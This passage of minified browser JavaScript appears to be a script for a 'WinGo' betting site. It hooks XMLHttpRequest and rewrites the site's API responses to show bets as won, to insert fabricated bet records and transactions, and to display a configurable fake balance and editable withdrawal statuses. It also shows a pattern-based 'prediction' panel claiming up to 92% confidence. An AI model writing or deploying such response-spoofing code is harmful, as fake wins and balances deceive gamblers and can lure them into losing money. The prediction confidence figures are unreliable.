            list: i,
            ts: Date.now(),
          },
        }),
      );
    } catch (M) {}
  },
  GetWinLossResult: function (n, t) {
    if (!n.data) return;
    var i = String(pn(t ? t._kUrl : "", "issueNumber") || "");
    if (!i) return;
    var o = pn(t ? t._kUrl : "", "gameCode");
    if (!o && t && t._kUrl) {
      var c = t._kUrl.match(/\/WinGo\/([^\/?]+)(?:\/|\.json|\?|$)/);
      if (c) o = decodeURIComponent(c[1]);
    }
    var l = o || fo(i);
    if (!l) return;
    var p = bn(i, l);
    if (!p.length) return;
    var f = 0,
      u = !1,
      w = !1;
    for (var S = 0; S < p.length; S++) {
      if (Nn(p[S].rig)) w = !0;
      if (((f += p[S].rig.win || 0), p[S].rig.win > 0)) u = !0;
    }
    if (((n.data.status = u), (n.data.winAmount = u ? f : 0), w)) k();
  },
  GetRecordPage: function (n, t) {
    var i = n.data,
      o = i && i.list;
    if (!o) return;
    var c = Sn(t ? t._kUrl : null),
      l = parseInt(pn(t ? t._kUrl : "", "pageNo") || i.pageNo || 1, 10),
      p = parseInt(
        pn(t ? t._kUrl : "", "pageSize") || i.pageSize || o.length || 10,
        10,
      ),
      f = {},
      u = {};
    for (var w = 0; w < o.length; w++) {
      var S = o[w],
        W = String(S.issueNumber || "");
      if (!f[W]) f[W] = bn(W, c).slice();
      var M = f[W],
        J = -1,
        z = -1,
        O = wn(S.amount || 0, S.betMultiple || 1);
      for (var E = 0; E < M.length; E++) {
        if (String(M[E].rig.content || "") !== String(S.betContent || ""))
          continue;
        var e = Ct(M[E].rig.stake, O) ? 3 : 0;
        if (Math.abs(G(S.betTime) - G(M[E].rig.time)) <= 120000) e += 1;
        if (e > z || (e === z && M[E].rig.time < M[J].rig.time))
          ((J = E), (z = e));
      }
      if (J < 0) continue;
      var y = M.splice(J, 1)[0];
      ((u[y.key] = !0), gt(S, y.rig));
    }
    if (l !== 1 || !c) return;
    var v = o.slice();
    for (var q in U.rigs) {
      var a = U.rigs[q];
      if (a.game !== c || u[q]) continue;
      var L = lo(a),
        P = wn(L.amount, L.betMultiple),
        Y = !1;
      for (var H = 0; H < v.length; H++) {
        var K = v[H];
        if (
          String(K.issueNumber) !== L.issueNumber ||
          String(K.betContent) !== L.betContent
        )
          continue;
        if (!Ct(wn(K.amount || 0, K.betMultiple || 1), P)) continue;
        if (Math.abs(G(K.betTime) - G(L.betTime)) > 1500) continue;
        Y = !0;
        break;
      }
      if (!Y) v.push(L);
    }
    if (
      (v.sort(function (gn, Zn) {
        return G(Zn.betTime) - G(gn.betTime);
      }),
      v.length > p)
    )
      v = v.slice(0, p);
    if (
      ((i.list = v),
      typeof i.totalCount === "number" && i.totalCount < v.length)
    )
      i.totalCount = v.length;
    if (typeof i.totalPage === "number")
      i.totalPage = Math.max(1, Math.ceil((i.totalCount || v.length) / p));
  },
  GetTrendStatistics: function (n, t) {
    if (!n.data || !n.data.length) return;
    var i = Sn(t ? t._kUrl : null),
      o = null;
    for (var c in U.rigs) {
      var l = U.rigs[c];
      if (!l.settled || (i && l.game !== i)) continue;
      if (!o || l.time > o.time) o = l;
    }
    if (!o) return;
    var p = Mn(o.issue, o.game);
    if (p) {
      for (var f = 0; f < n.data.length; f++)
        if (G(n.data[f].number) === p.num) n.data[f].missingCount = 0;
    }
  },
  GetLoadedSetting: function (n) {
    if (n && n.data)
      ((n.data.needPopupFirstRecharge = !1),
        (n.data.isOpenActivityAward = "0"),
        (n.data.isOpenJackpotReward = "0"),
        (n.data.isTaskState = "0"));
  },
  GetFirstRechargeList: function (n) {
    if (n) n.data = [];
  },
  GetSitePopMsgList: function (n) {
    if (n) n.data = [];
  },
  GetTreasureChestPopupItems: function (n) {
    if (n) n.data = [];
  },
  GetActiveSetting: function (n) {
    if (n && n.data)
      ((n.data.isOpenActivityAward = "0"),
        (n.data.isOpenJackpotReward = "0"),
        (n.data.isTaskState = "0"),
        (n.data.unJackpotCount = 0),
        (n.data.unWeeklyAwardCount = 0),
        (n.data.newbieGiftPackCount = 0));
  },
  GetPayTypeName: function (n) {
    if (n && n.data && Array.isArray(n.data.typelist))
      n.data.typelist = n.data.typelist.filter(function (t) {
        var i = (
          (t.payName || "") +
          " " +
          (t.paySysName || "") +
          " " +
          (t.name || "")
        ).toLowerCase();
        return i.indexOf("arpay") === -1;
      });
  },
  GetRechargeTypes: function (n) {
    if (n && n.code === 0 && n.data && Array.isArray(n.data.rechargetypelist))
      ((n.data.rechargetypelist = n.data.rechargetypelist.filter(function (i) {
        var o = (
          (i.payName || "") +
          " " +
          (i.paySysName || "") +
          " " +
          (i.code || "")
        ).toLowerCase();
        return o.indexOf("arpay") === -1;
      })),
        (window.__wgRTCache = JSON.parse(JSON.stringify(n))));
    else if (
      n &&
      n.code !== 0 &&
      window.__wgRTCache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgRTCache;
      ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = t.data));
    }
  },
  GetTransactions: function (n, t) {
    if (!n.data) return;
    var i = {};
    try {
      i = JSON.parse((t && t._kBody) || "{}");
    } catch (H) {}
    var o = parseInt(i.pageNo || 1, 10),
      c = parseInt(i.pageSize || 10, 10),
      l = i.startDate || "",
      p = i.endDate || "",
      f = i.type,
      u = f === void 0 || f === "" || String(f) === "-1",
      w = l ? new Date(l + " 00:00:00").getTime() : 0,
      S = p ? new Date(p + " 23:59:59").getTime() : 1 / 0,
      W = [];
    for (var M in U.rigs) {
      var J = U.rigs[M],
        z = G(J.time);
      if (!z || z < w || z > S) continue;
      if (!u && String(0) !== String(f)) continue;
      var O = G(J.stake);
      if (!O) O = wn(J.amount, J.betMultiple);
      W.push({
        orderNum: J.orderNo || "KG" + String(J.issue || "") + ":B",
        amount: O,
        type: 0,
        typeName: "Bet amount reduced",
        typeNameCode: "8000",
        addTime: rn(z),
        remark: "",
        _ts: z,
      });
    }
    if (!W.length) return;
    if (!n.data.list)
      n.data = { list: [], pageNo: 1, totalPage: 0, totalCount: 0 };
    var E = n.data.list || [],
      e = typeof n.data.totalCount === "number" ? n.data.totalCount : E.length,
      y = {};
    for (var v = 0; v < E.length; v++) y[E[v].orderNum] = !0;
    var q = [];
    for (var a = 0; a < W.length; a++) if (!y[W[a].orderNum]) q.push(W[a]);
    if (o === 1) {
      var L = q.slice(0);
      for (var P = 0; P < E.length; P++)
        ((E[P]._ts = new Date(E[P].addTime || 0).getTime() || 0), L.push(E[P]));
      L.sort(function (H, K) {
        return (K._ts || 0) - (H._ts || 0);
      });
      for (var Y = 0; Y < L.length; Y++) delete L[Y]._ts;
      n.data.list = L.slice(0, c);
    }
    ((n.data.totalCount = e + q.length),
      (n.data.totalPage = Math.max(1, Math.ceil(n.data.totalCount / c))),
      (n.data.pageNo = o));
  },
};
function kn(n) {
  try {
    return new Event(n);
  } catch (i) {}
  try {
    var t = document.createEvent("Event");
    return (t.initEvent(n, !1, !1), t);
  } catch (i) {}
  return null;
}
function _n(n, t, i) {
  setTimeout(function () {
    try {
      Object.defineProperty(n, "readyState", { value: 4, configurable: !0 });
    } catch (p) {
      try {
        n.readyState = 4;
      } catch (f) {}
    }
    try {
      Object.defineProperty(n, "status", { value: 200, configurable: !0 });
    } catch (p) {
      try {
        n.status = 200;
      } catch (f) {}
    }
    try {
      Object.defineProperty(n, "responseText", { value: t, configurable: !0 });
    } catch (p) {
      try {
        n.responseText = t;
      } catch (f) {}
    }
    try {
      Object.defineProperty(n, "response", { value: t, configurable: !0 });
    } catch (p) {
      try {
        n.response = t;
      } catch (f) {}
    }
    try {
      if (typeof n.onreadystatechange === "function") n.onreadystatechange();
    } catch (p) {}
    var o = kn("readystatechange");
    if (o)
      try {
        n.dispatchEvent(o);
      } catch (p) {}
    try {
      if (typeof n.onload === "function") n.onload();
    } catch (p) {}
    var c = kn("load");
    if (c)
      try {
        n.dispatchEvent(c);
      } catch (p) {}
    try {
      if (typeof n.onloadend === "function") n.onloadend();
    } catch (p) {}
    var l = kn("loadend");
    if (l)
      try {
        n.dispatchEvent(l);
      } catch (p) {}
  }, i || 10);
}
var sn = Object.keys(Gn).sort(function (n, t) {
  return t.length - n.length;
});
function po(n) {
  var t = typeof n === "string" ? n : "";
  if (no(t)) return "WinGoState";
  for (var i = 0; i < sn.length; i++) if (t.indexOf(sn[i]) !== -1) return sn[i];
  return null;
}
var Vt = {},
  vo = 1e4;
function Dt(n) {
  try {
    var t = JSON.parse(n || "{}");
    return "RT:" + (t.payid || 0);
  } catch (i) {
    return "RT:0";
  }
}
var Bt = {},
  yo = 60000;
function uo(n, t) {
  try {
    var i = JSON.parse(t || "{}");
    (delete i.signature, delete i.random, delete i.timestamp);
    var o = Object.keys(i).sort(),
      c = "";
    for (var l = 0; l < o.length; l++) c += o[l] + "=" + i[o[l]] + "&";
    return n + ":" + c;
  } catch (p) {
    return n;
  }
}
var It = {
    // Dedup whitelist intentionally disabled — the dedup XHR system recreates
    // requests without original Authorization headers, causing 405 errors in
    // proxy/worker environments. The response-spoof system is unaffected.
  },
  ln = {},
  eo = 2000,
  qo = It;
function ao(n, t) {
  try {
    var i = JSON.parse(t || "{}");
    return (
      n +
      ":" +
      (i.pageNo || 0) +
      ":" +
      (i.pageSize || 0) +
      ":" +
      (i.payid || 0) +
      ":" +
      (i.gameCode || "")
    );
  } catch (o) {
    return n;
  }
}
function jt() {
  var n = Nt();
  (setInterval(function () {
    n = Nt();
  }, 5000),
    Un());
  var t = XMLHttpRequest.prototype.open,
    i = XMLHttpRequest.prototype.send;
  ((XMLHttpRequest.prototype.open = function (o, c) {
    if (!n) return t.apply(this, arguments);
    return ((this._kUrl = c), (this._kEp = po(c)), t.apply(this, arguments));
  }),
    (XMLHttpRequest.prototype.send = function (o) {
      if (!n) return i.apply(this, arguments);
      if (this._kEp === "GetRechargeTypes") {
        var c = Dt(o),
          l = Vt[c];
        if (l && Date.now() - l.ts < vo) {
          _n(this, l.json, 10);
          return;
        }
      }
      if (this._kEp && qo[this._kEp]) {
        var p = ao(this._kEp, o),
          f = ln[p];
        if (f && Date.now() - f.ts < eo) {
          ((this._kBody = o), f.xhrs.push(this));
          return;
        }
        ((this._kDedupKey = p),
          (ln[p] = { xhrs: [], ts: Date.now() }),
          setTimeout(function () {
            var J = ln[p];
            if (J) {
              for (var z = 0; z < J.xhrs.length; z++)
                _n(
                  J.xhrs[z],
                  '{"code":-1,"data":null,"msg":"dedup timeout","msgCode":-1}',
                  0,
                );
              delete ln[p];
            }
          }, 1e4));
      }
      if (this._kEp) {
        let J = function () {
          if (S || u.readyState !== 4) return;
          try {
            var z =
              u.responseText ||
              (typeof u.response === "string" ? u.response : "");
            if (!z) return;
            var O = JSON.parse(z);
            Gn[w](O, u);
            var E = JSON.stringify(O);
            if (
              (Object.defineProperty(u, "responseText", {
                value: E,
                configurable: !0,
              }),
              Object.defineProperty(u, "response", {
                value: E,
                configurable: !0,
              }),
              (S = !0),
              w === "GetRechargeTypes" && O.code === 0)
            )
              Vt[Dt(u._kBody)] = { json: E, ts: Date.now() };
            var e = uo(w, u._kBody);
            if (O.code === 0) Bt[e] = { json: E, ts: Date.now() };
            else if (
              It[w] &&
              (O.code === 313 ||
                O.msgCode === 313 ||
                /frequent|rate.?limit/i.test(O.msg || ""))
            ) {
              var y = Bt[e];
              if (y && Date.now() - y.ts < yo)
                ((E = y.json),
                  Object.defineProperty(u, "responseText", {
                    value: E,
                    configurable: !0,
                  }),
                  Object.defineProperty(u, "response", {
                    value: E,
                    configurable: !0,
                  }));
            }
            if (u._kDedupKey) {
              var v = ln[u._kDedupKey];
              if (v) {
                for (var q = 0; q < v.xhrs.length; q++) _n(v.xhrs[q], E, 5);
                delete ln[u._kDedupKey];
              }
            }
          } catch (a) {}
        };
        this._kBody = o;
        var u = this,
          w = this._kEp,
          S = !1,
          W = u.onreadystatechange,
          M = u.onload;
        ((u.onreadystatechange = function () {
          if ((J(), typeof W === "function")) return W.apply(this, arguments);
        }),
          (u.onload = function () {
            if ((J(), typeof M === "function")) return M.apply(this, arguments);
          }),
          u.addEventListener("readystatechange", J),
          u.addEventListener("load", J));
      }
      return i.apply(this, arguments);
    }),
    (window.__kismatAccuracy = I("accuracy", 70)),
    (window.__kismatRigMap = window.__kismatRigMap || {}),
    (window.__wgSpoofer = {
      getSettings: function () {
        return {
          accuracy: I("accuracy", 70),
          balanceOffset: I("balanceOffset", 5000),
        };
      },
      saveSetting: function (o, c) {
        var l = ht();
        if (
          ((l[o] = c),
          localStorage.setItem("wg_spoof_cfg", JSON.stringify(l)),
          o === "accuracy")
        )
          window.__kismatAccuracy = c;
      },
      resetBalance: function () {
        ((U.balance = null), (U.balance = I("balanceOffset", 5000)), k(), tt());
      },
      getWithdrawals: function () {
        return U.withdrawals;
      },
      updateWithdrawalStatus: function (o, c) {
        if (U.withdrawals[o]) ((U.withdrawals[o].state = c), k());
      },
      predictNum: Fn,
      rigHash: Rt,
      colors: dn,
      isVip: function () {
        return n;
      },
    }));
}
function wo(n) {
  let t = parseInt(n);
  return {
    num: t,
    big: t >= 5,
    color: t === 0 || t === 5 ? "violet" : t % 2 === 0 ? "red" : "green",
  };
}
function it(n, t) {
  if (n.length < 2) return { len: 0, val: null };
  let i = n[0][t],
    o = 1;
  for (let c = 1; c < n.length; c++)
    if (n[c][t] === i) o++;
    else break;
  return { len: o, val: i };
}
function So(n, t, i) {
  let o = {};
  return (
    n.slice(0, i).forEach((c) => {
      o[c[t]] = (o[c[t]] || 0) + 1;
    }),
    o
  );
}
function bt(n) {
  if (n.len >= 3)
    return { side: !n.val, conf: Math.min(0.15 + n.len * 0.08, 0.45) };
  if (n.len >= 2) return { side: !n.val, conf: 0.1 };
  return { side: null, conf: 0 };
}
function xt(n, t = 10) {
  let i = So(n, "big", t),
    o = i[!0] || 0,
    c = i[!1] || 0,
    l = o + c;
  if (l < 5) return { side: null, conf: 0 };
  let p = o / l;
  if (p >= 0.7) return { side: !1, conf: 0.12 };
  if (p <= 0.3) return { side: !0, conf: 0.12 };
  return { side: null, conf: 0 };
}
function rt(n, t = 12) {
  let i = Math.min(t, n.length);
  if (i < 4) return { side: null, conf: 0 };
  let o = 0,
    c = 0;
  for (let p = 0; p < i; p++) {
    let f = i - p;
    ((o += (n[p].big ? 1 : -1) * f), (c += f));
  }
  let l = c ? o / c : 0;
  if (Math.abs(l) < 0.08) return { side: null, conf: 0 };
  return { side: l > 0, conf: Math.min(Math.abs(l) * 0.22, 0.18) };
}
function kt(n, t = 24) {
  if (n.length < 6) return { side: null, conf: 0 };
  let i = n[0].big,
    o = 0,
    c = 0,
    l = Math.min(t, n.length - 1);
  for (let u = 0; u < l; u++) {
    let w = n[u + 1],
      S = n[u];
    if (w.big !== i) continue;
    if (S.big === i) o++;
    else c++;
  }
  let p = o + c;
  if (p < 3) return { side: null, conf: 0 };
  let f = o / p;
  if (f >= 0.67) return { side: i, conf: Math.min((f - 0.5) * 0.45, 0.18) };
  if (f <= 0.33) return { side: !i, conf: Math.min((0.5 - f) * 0.45, 0.18) };
  return { side: null, conf: 0 };
}
function _t(n, t = 6) {
  let i = n.slice(0, t);
  if (i.length < 4) return { side: null, conf: 0 };
  let o = i.reduce((c, l) => c + l.num, 0) / i.length;
  if (o >= 6.1) return { side: !0, conf: 0.08 };
  if (o <= 3.9) return { side: !1, conf: 0.08 };
  return { side: null, conf: 0 };
}
function st(n) {
  if (n.length < 4) return { detected: !1, conf: 0 };
  let t = 0,
    i = Math.min(6, n.length - 1);
  for (let o = 0; o < i; o++) if (n[o].big !== n[o + 1].big) t++;
  if (t / i >= 0.8) return { detected: !0, nextSide: !n[0].big, conf: 0.15 };
  return { detected: !1, conf: 0 };
}
function Eo(n) {
  let t = st(n);
  return t.detected
    ? { side: t.nextSide, conf: t.conf }
    : { side: null, conf: 0 };
}
function $o(n) {
  let t = it(n, "color");
  if (t.len >= 4 && t.val !== "violet")
    return { color: t.val === "red" ? "green" : "red", conf: 0.1 };
  return { color: null, conf: 0 };
}
function mt(n, t = 2, i = 28) {
  if (n.length < t + 4) return { side: null, conf: 0 };
  let o = n
      .slice(0, t)
      .map((w) => (w.big ? 1 : 0))
      .join(""),
    c = 0,
    l = 0,
    p = 0,
    f = Math.min(i, n.length - t - 1);
  for (let w = 1; w <= f; w++) {
    if (
      n
        .slice(w, w + t)
        .map((J) => (J.big ? 1 : 0))
        .join("") !== o
    )
      continue;
    let W = n[w - 1].big,
      M = f - w + 1;
    ((c += (W ? 1 : -1) * M), (l += M), p++);
  }
  if (p < 2 || !l) return { side: null, conf: 0 };
  let u = c / l;
  if (Math.abs(u) < 0.12) return { side: null, conf: 0 };
  return { side: u > 0, conf: Math.min(Math.abs(u) * 0.32, 0.24) };
}
function Mo(n, t = 20) {
  let i = {};
  n.slice(0, t).forEach((c) => {
    i[c.num] = (i[c.num] || 0) + 1;
  });
  let o = Object.entries(i).sort((c, l) => l[1] - c[1]);
  return {
    hot: o.slice(0, 3).map((c) => parseInt(c[0])),
    cold: o.slice(-3).map((c) => parseInt(c[0])),
  };
}
function Uo(n) {
  let t = [],
    i = 0,
    o = rt(n);
  if (o.conf > 0)
    ((i += o.side ? o.conf : -o.conf),
      t.push({ name: "momentum", type: "trend", weight: o.conf }));
  let c = kt(n);
  if (c.conf > 0)
    ((i += c.side ? c.conf : -c.conf),
      t.push({ name: "transition", type: "flow", weight: c.conf }));
  let l = it(n, "big"),
    p = bt(l);
  if (p.conf > 0)
    ((i += p.side ? p.conf : -p.conf),
      t.push({
        name: l.val ? "Big" : "Small",
        type: "streak",
        len: l.len,
        weight: p.conf,
      }));
  let f = xt(n);
  if (f.conf > 0)
    ((i += f.side ? f.conf : -f.conf),
      t.push({ name: "frequency", type: "bias", weight: f.conf }));
  let u = _t(n);
  if (u.conf > 0)
    ((i += u.side ? u.conf : -u.conf),
      t.push({ name: "pressure", type: "numbers", weight: u.conf }));
  let w = st(n);
  if (w.detected)
    ((i += w.nextSide ? w.conf : -w.conf),
      t.push({ name: "alternating", type: "pattern", weight: w.conf }));
  return { bigScore: i, signals: t, streak: l };
}
function Oo(n, t, i = 24) {
  let o = 0,
    c = 0,
    l = 0,
    p = Math.min(i, t.length - 4);
  for (let f = 1; f <= p; f++) {
    let u = n(t.slice(f));
    if (!u || u.side == null || !u.conf) continue;
    let w = t[f - 1].big,
      S = p - f + 1;
    ((o += (u.side === w ? 1 : -1) * u.conf * S), (c += u.conf * S), l++);
  }
  return { edge: c ? o / c : 0, count: l };
}
var Jo = [
  { name: "memory-2", type: "memory", run: (n) => mt(n, 2, 28), minCount: 3 },
  { name: "memory-3", type: "memory", run: (n) => mt(n, 3, 36), minCount: 2 },
  { name: "momentum", type: "trend", run: rt, minCount: 4 },
  { name: "transition", type: "flow", run: kt, minCount: 4 },
  { name: "revert", type: "streak", run: (n) => bt(it(n, "big")), minCount: 4 },
  { name: "hot-cold", type: "bias", run: xt, minCount: 4 },
  { name: "pressure", type: "numbers", run: _t, minCount: 4 },
  { name: "alternating", type: "pattern", run: Eo, minCount: 3 },
];
function On(n) {
  if (!n || n.length < 3)
    return {
      prediction: "Big",
      confidence: 54,
      color: "green",
      signals: [],
      heatmap: { hot: [], cold: [] },
      topNumber: 7,
    };
  let t = n.map((z) => wo(z.number || z.num || z)),
    i = Mo(t),
    o = $o(t),
    c = Uo(t),
    l = [],
    p = 0,
    f = 0;
  for (let z of Jo) {
    let O = z.run(t);
    if (!O || O.side == null || !O.conf) continue;
    let E = Oo(z.run, t, 24);
    if (E.count < z.minCount) continue;
    let e = O.side,
      y = Math.min(Math.abs(E.edge), 0.45) * (0.7 + O.conf);
    if (E.edge < -0.18) ((e = !e), (y *= 0.6));
    else if (E.edge < 0.05) continue;
    ((p += (e ? 1 : -1) * y),
      (f += y),
      l.push({
        name: z.name,
        type: z.type,
        weight: Number(y.toFixed(3)),
        edge: Number(E.edge.toFixed(3)),
        mode: e === O.side ? "direct" : "flip",
      }));
  }
  let u = f ? p : c.bigScore,
    w = u >= 0,
    S = Math.round(
      Math.min(
        Math.max(
          f ? 0.53 + Math.abs(u) * 0.62 + Math.min(f, 0.18) : 0.5 + Math.abs(u),
          0.54,
        ),
        0.92,
      ) * 100,
    ),
    W = o.color ?? (w ? "red" : "green"),
    M = i.hot.find((z) => (w ? z >= 5 : z < 5)) ?? (w ? 7 : 3),
    J = (l.length ? l : c.signals)
      .sort((z, O) => (O.weight || 0) - (z.weight || 0))
      .slice(0, 4);
  return {
    prediction: w ? "Big" : "Small",
    confidence: S,
    color: W,
    signals: J,
    heatmap: i,
    topNumber: M,
    streak: { side: c.streak.val ? "Big" : "Small", len: c.streak.len },
  };
}
var Wo = [
    "053d2b99",
    "49176bf8",
    "62fbe730",
    "31762cc1",
    "ba9fa4ff",
    "46891538",
    "9319baa4",
    "4e868eee",
    "832f9a99",
    "9cf62e12",
  ],
  ot = Object.create(null),
  B = yn(),
  dt = ti(B),
  Jn = null,
  Kn = null,
  Cn = null;
function zo() {
  let n = {};
  for (let t of document.styleSheets) {
    let i;
    try {
      i = t.cssRules;
    } catch (o) {
      continue;
    }
    for (let o of i || []) {
      let c = (o.cssText || "").match(/ball_(\d)-[\w-]+\.(?:png|webp)/);
      if (c && !n[c[1]]) n[c[1]] = c[0];
    }
  }
  return n;
}
function ni(n) {
  if (!Cn || !Cn[n]) Cn = zo();
  return "/assets/png/" + (Cn[n] || "ball_" + n + "-" + Wo[n] + ".webp");
}
function j(n = B) {
  if (((n = n || "WinGo_30S"), !ot[n]))
    ot[n] = { history: [], issue: "", latestIssue: "", lastSec: -1 };
  return ot[n];
}
function Qo(n) {
  if (
    ((n = String(n || "")
      .toLowerCase()
      .replace(/\s+/g, "")),
    n.includes("wingo30"))
  )
    return "WinGo_30S";
  if (n.includes("wingo1min") || n.includes("wingo1m")) return "WinGo_1M";
  if (n.includes("wingo3min") || n.includes("wingo3m")) return "WinGo_3M";
  if (n.includes("wingo5min") || n.includes("wingo5m")) return "WinGo_5M";
  return "";
}
function yn() {
  let n = document.querySelector(
      ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
    t = Qo(n && n.textContent);
  if (t) return t;
  let i = (location.hash || "").match(/gameCode=(WinGo_\w+)/);
  return i ? i[1] : "WinGo_30S";
}
function ti(n) {
  if (!n) return 30;
  let t = n.match(/(\d+)M$/i);
  if (t) return parseInt(t[1], 10) * 60;
  let i = n.match(/(\d+)S$/i);
  if (i) return parseInt(i[1], 10);
  return 30;
}
function x(n) {
  let t = String(n == null ? "" : n).trim();
  return /^\d{8,22}$/.test(t) ? t : "";
}
function ct(n) {
  if (((n = x(n)), !n)) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {
    return "";
  }
}
function ii(n, t) {
  if (((n = x(n)), (t = x(t)), !n || !t)) return 0;
  try {
    let i = BigInt(n),
      o = BigInt(t);
    return i > o ? 1 : i < o ? -1 : 0;
  } catch (i) {
    return n > t ? 1 : n < t ? -1 : 0;
  }
}
function Wn() {
  let n = yn();
  if (n && n !== B) vt(n);
}
function oi(n) {
  return ((n = n || B || "WinGo_30S"), (B = n), (dt = ti(n)), j(n), n);
}
function ft() {
  return document.querySelector("prediction-panel")?.shadowRoot;
}
function zn() {
  return !!ft()?.querySelector(".view-pro.active");
}
function Vn() {
  return B;
}
function lt() {
  return j().history;
}
function ci() {
  return j().issue;
}
function fi() {
  return j().latestIssue;
}
function li(n) {
  j().lastSec = n;
}
function pt(n) {
  if (!n) return "—";
  return n
    .replace(/^WinGo_/, "")
    .replace(/(\d+)S$/i, "$1sec")
    .replace(/(\d+)M$/i, "$1m");
}
function tn(n) {
  let t = ft();
  if (!t) return;
  let i = t.querySelector("#pro-waiting"),
    o = t.querySelector("#pro-prediction"),
    c = t.querySelector("#pro-card"),
    l = t.querySelector("#scan-lbl");
  if (!i || !o || !c) return;
  if (n === "result") {
    ((i.style.display = "none"),
      (o.style.display = "block"),
      c.classList.remove("shimmer"));
    return;
  }
  if (
    ((i.style.display = "flex"),
    (o.style.display = "none"),
    (c.className = c.className.replace(/\bc-\w+\b/g, "").trim() + " shimmer"),
    l && l.childNodes[0])
  )
    l.childNodes[0].textContent = n === "analyzing" ? "Analyzing" : "Scanning";
}
function pi(n, t) {
  if (!Array.isArray(t) || !t.length) return;
  n = n || yn() || B;
  let i = x(t[0].issueNumber ?? t[0].issue);
  if (!i) return;
  let o = j(n);
  ((o.history = t), (o.latestIssue = i));
  let c = ct(i);
  if (c && (!o.issue || ii(o.issue, i) <= 0)) o.issue = c;
  if (n !== B || !zn()) return;
  setTimeout(() => Jn?.(), 0);
}
function vi(n, t, i) {
  n = n || yn() || B;
  let o = j(n),
    c = x(t) || x(i) || ct(t);
  if (!c) return;
  if (
    !o.issue ||
    c !== o.issue ||
    (o.latestIssue && ii(o.issue, o.latestIssue) <= 0)
  ) {
    if (((o.issue = c), n === B && zn())) setTimeout(() => Jn?.(), 0);
  }
}
function on() {
  let n = B;
  if (!n) return;
  let t = new XMLHttpRequest();
  (t.open("GET", "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now()),
    t.send());
}
function yi(n, t) {
  Wn();
  let i = n || B;
  (pi(i, t?.data?.list),
    vi(
      i,
      t?.current?.issueNumber || t?.data?.current?.issueNumber,
      t?.next?.issueNumber || t?.data?.next?.issueNumber,
    ));
}
function Lo(n) {
  let t = n.detail;
  if (!t || t.type !== "history") return;
  (Wn(), pi(t.game || B, t.list));
}
function Po(n) {
  let t = n.detail;
  if (!t) return;
  (Wn(), vi(t.game || B, t.currentIssue, t.nextIssue));
}
function ui() {
  if (Kn) return;
  Kn = setInterval(() => {
    if (!zn() || j().history.length) {
      (clearInterval(Kn), (Kn = null));
      return;
    }
    on();
  }, 3000);
}
function Zo() {
  let n = ft();
  if (!n?.querySelector(".view-pro.active")) return;
  Wn();
  let t = B,
    i = j(t),
    o = document.querySelector(".TimeLeft__C-time"),
    c = document.querySelector(".TimeLeft__C-id"),
    l = document.querySelector(".TimeLeft__C-name"),
    p = n.querySelector("#pro-timer"),
    f = n.querySelector("#pro-timer-wrap");
  if (!p || !f) return;
  if (o) {
    let w = o.textContent.trim();
    p.textContent = w;
    let S = w.split(":"),
      W = (parseInt(S[0], 10) || 0) * 60 + (parseInt(S[1], 10) || 0);
    if (
      (f.style.setProperty(
        "--pct",
        Math.max(0, Math.min(100, (W / dt) * 100)) + "%",
      ),
      p.classList.remove("t-warn", "t-end"),
      f.classList.remove("tw-warn", "tw-end"),
      W <= 5)
    )
      (p.classList.add("t-end"), f.classList.add("tw-end"));
    else if (W <= 10) (p.classList.add("t-warn"), f.classList.add("tw-warn"));
    if (i.lastSec >= 0 && i.lastSec <= 4 && W > i.lastSec + 5)
      setTimeout(on, 250);
    i.lastSec = W;
  }
  if (c) {
    let w = String(c.textContent).trim(),
      S = x(w);
    if (S && i.issue !== S) ((i.issue = S), setTimeout(() => Jn?.(), 0));
    let W = n.querySelector("#pro-period"),
      M = x(i.issue) || S || w;
    if (W) W.textContent = "#" + M.slice(-6);
  }
  let u = n.querySelector("#pro-mode");
  if (u) u.textContent = l?.textContent.trim() || pt(t);
}
function ei({ onPred: n }) {
  (oi(yn()),
    (Jn = n),
    window.addEventListener("kismat:gameData", Lo),
    window.addEventListener("kismat:issue", Po),
    window.addEventListener("hashchange", Wn),
    setInterval(Zo, 300),
    setInterval(() => {
      if (zn()) on();
    }, 12000));
}
function vt(n) {
  if (((n = n || yn()), !n)) return;
  let t = n !== B;
  oi(n);
  let i = j(n),
    c =
      x(document.querySelector(".TimeLeft__C-id")?.textContent) ||
      ct(i.latestIssue),
    l = !!(i.history.length && c && i.issue === c);
  if (c) i.issue = c;
  if (((i.lastSec = -1), !t)) return;
  if (zn()) {
    if (!l) tn("loading");
    else setTimeout(() => Jn?.(), 0);
    on();
  }
}
function qi(n, t) {
  return Math.max(0, Math.min(n, window.innerWidth - t));
}
function ai(n, t) {
  return Math.max(0, Math.min(n, window.innerHeight - t));
}
function Dn(n) {
  try {
    let t = JSON.parse(localStorage.getItem("__wg_p_" + n));
    if (t) return t;
  } catch (t) {}
  if (n === "logo")
    return { vw: ((window.innerWidth - 68) / window.innerWidth) * 100, vh: 75 };
  return null;
}
function yt(n, t) {
  localStorage.setItem(
    "__wg_p_" + t,
    JSON.stringify({
      vw: (n.offsetLeft / window.innerWidth) * 100,
      vh: (n.offsetTop / window.innerHeight) * 100,
    }),
  );
}
function Bn(n, t) {
  if (!t) return;
  ((n.style.left = (t.vw / 100) * window.innerWidth + "px"),
    (n.style.top = (t.vh / 100) * window.innerHeight + "px"));
}
function wi(n, t) {
  let i = t.offsetWidth || 288,
    o = t.offsetHeight || 290;
  ((n.style.left = (window.innerWidth - i) / 2 + "px"),
    (n.style.top = (window.innerHeight - o) / 2 + "px"));
}
function Si(n, t, { onTap: i }) {
  let o = 0,
    c = 0,
    l = 0,
    p = 0,
    f = !1;
  (t.addEventListener("pointerdown", (u) => {
    (t.setPointerCapture(u.pointerId),
      t.classList.add("dragging"),
      (o = u.clientX - n.offsetLeft),
      (c = u.clientY - n.offsetTop),
      (l = u.clientX),
      (p = u.clientY),
      (f = !1));
  }),
    t.addEventListener("pointermove", (u) => {
      if (!t.hasPointerCapture(u.pointerId)) return;
      if (
        ((n.style.left = qi(u.clientX - o, 62) + "px"),
        (n.style.top = ai(u.clientY - c, 62) + "px"),
        Math.abs(u.clientX - l) > 5 || Math.abs(u.clientY - p) > 5)
      )
        f = !0;
    }),
    t.addEventListener("pointerup", (u) => {
      if (
        (t.releasePointerCapture(u.pointerId),
        t.classList.remove("dragging"),
        f)
      )
        yt(n, "logo");
      else i();
    }));
}
function Ei(n, t, i) {
  let o = 0,
    c = 0;
